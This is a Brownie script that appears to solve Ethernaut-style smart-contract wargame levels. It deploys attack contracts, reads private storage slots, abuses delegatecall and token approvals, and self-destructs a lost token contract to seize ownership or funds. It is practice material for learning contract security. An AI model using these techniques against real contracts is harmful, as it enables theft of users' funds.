from brownie import config, accounts, network, chain, web3, Atk_Telephone, Telephone, Delegation, Token, GatekeeperOne, Atk_Gate1, \
    Fallback, Vault, Privacy, GatekeeperTwo, Atk_Gate2, NaughtCoin, Atk_Naughtcoin, Preservation, Atk_Preservation, Atk_Recovery, SimpleToken

# addr 0x833514593c7798551A20Ac69f98D486e2A12dFe8
wallet: network.account.LocalAccount = accounts.add(config["wallets"]["from_key"])
# dev env
if network.chain.id == 1337:
    accounts[0].transfer(wallet, "10 ether")

# default: {"from": wallet, "gas_limit": 1000000, "priority_fee": "5 gwei"}
accounts.default = wallet
network.priority_fee("3 gwei")
network.gas_limit(1000000)


def _get_value_in_slot(slot, addr):
    slot_addr = f"0x{slot:064x}"
    return web3.eth.get_storage_at(addr, slot_addr).hex()


def main():
    # telephone("")
    # delegation("")
    # gateKeeper1("")
    # fallback("")
    # vault("")
    # privacy("")
    # gateKeeper2("")
    # naughtcoin("")
    # preservation("")
    recovery2("0x19EC85484cf30cdE56090a4e6d0CB30829851dA4")
    # recovery("0x19EC85484cf30cdE56090a4e6d0CB30829851dA4")
    pass

# parent: 0x19EC85484cf30cdE56090a4e6d0CB30829851dA4
# child: 0x4A8a9B50CEd474eccB4E5e35aE3cD007C13D3D01
def recovery(addr):
    cur_nonce = web3.eth.getTransactionCount(addr)
    atk = Atk_Recovery.deploy()
    lost_addr = atk.contract_address_generator(addr, cur_nonce - 1)
    t = SimpleToken.at(lost_addr)
    print("lost token: ", lost_addr)
    t.destroy(wallet, {"priority_fee": "5 gwei"})


def recovery2(addr):
    import rlp
    h = web3.keccak(rlp.encode([addr.lower(), 1])).hex()
    contract_addr = "0x" + h[-40:]
    checksum_addr = web3.toChecksumAddress(h[26:])
    print(contract_addr)
    print(checksum_addr)


def preservation(addr):
    p = Preservation.at(addr)
    atk = Atk_Preservation.deploy(p)
    atk.atk()
    print(p.owner())


def telephone(addr):
    Telephone.at(addr)
    tele = Telephone[-1]
    Atk_Telephone.deploy(tele, {"from": accounts[0]})
    atk = Atk_Telephone[-1]
    atk.atk()


def fallback(addr):
    fb = Fallback.at(addr)
    fb.contribute()
    wallet.transfer(fb, 100000, priority_fee="5 gwei")
    fb.withdraw()


def delegation(addr):
    pwn = web3.keccak(text="pwn()").hex()
    # fallback() not payable => send 0 wei
    wallet.transfer(addr, amount=0, data=pwn, gas_limit=1000000, priority_fee="2 gwei")


def vault(vault_addr):
    key = _get_value_in_slot(1, vault_addr)
    # key_bytes = bytes.fromhex(key[2:])
    v = Vault.at(vault_addr)
    v.unlock(key)


def privacy(addr):
    p = Privacy.at(addr)
    data = _get_value_in_slot(5, addr)
    data_16bytes_hex = data[:-32]
    data_16bytes = bytes.fromhex(data_16bytes_hex[2:])  # s5_value = s5_bytes.hex()
    p.unlock(data_16bytes_hex)


def token(addr):
    accounts.add()
    receiver = accounts[1]
    t = Token.at(addr)
    t.transfer(receiver.address, 21)
    print(t.balanceOf(wallet))


def gateKeeper1(gate_addr):
    # uint16(uint160(tx.origin))
    uint16_wallet = wallet.address[-4:]
    # uint32(uint64(Key)) = uint16_wallet
    uint32_key = uint16_wallet.zfill(8)
    # uint64(Key) != uint32_key
    uint64_key = ("1" + uint32_key).zfill(16)

    gate1 = GatekeeperOne.at(gate_addr)
    atk = Atk_Gate1.deploy(gate1, {"from": wallet})
    # brute force need alot gas
    atk.enter(uint64_key, {"gas": 10000000})
    print(gate1.entrant())


def gateKeeper2(gate_addr):
    Atk_Gate2.deploy(gate_addr)


def naughtcoin(addr):
    n = NaughtCoin.at(addr)
    receiver = Atk_Naughtcoin.deploy(addr)
    balance = n.balanceOf(wallet)
    n.approve(receiver, balance)
    receiver.withdraw()
